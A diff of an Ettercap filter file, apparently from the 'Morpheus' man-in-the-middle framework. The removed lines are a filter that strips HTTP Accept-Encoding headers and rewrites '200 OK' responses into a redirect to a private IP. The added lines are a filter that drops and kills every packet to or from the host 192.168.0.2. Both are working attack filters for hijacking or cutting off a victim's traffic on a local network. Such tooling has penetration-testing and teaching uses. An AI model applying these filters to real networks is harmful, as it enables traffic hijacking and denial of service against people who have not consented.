@@ -11,29 +11,21 @@
 ############################################################################
 
 ##
-#  This filter will redirect target request 
-#  to the specified ip address.
+#  This filter will drop (kill) any packet send
+#  to the specified ip address (target ip addr)
 ##
 
 
-##########################
-## Zap Content Encoding ##
-##########################
-if (ip.proto == TCP && tcp.dst == 80){
-   if (search(DATA.data, "Accept-Encoding")){
-    replace("Accept-Encoding", "Accept-Rubbish!");
-    msg("[Morpheus Filter] Encoding zapped.");
-   }
+# Filter only from source
+if (ip.src == '192.168.0.2') {
+ msg("[Morpheus] packet droped from source...");
+ drop();
+kill();
 }
 
-
-#####################
-## Replace Content ##
-#####################
-if (ip.proto == TCP && tcp.src == 80){
- replace("200 OK", "301 Moved Permanently
- Location: http://192.168.200.201/
-");
-
-msg("[Morpheus Filter] redirect successefully...\n");
+# Filter only from destination
+if (ip.dst == '192.168.0.2') {
+ msg("[Morpheus] packet droped from destination...\n");
+ drop();
+kill();
 }
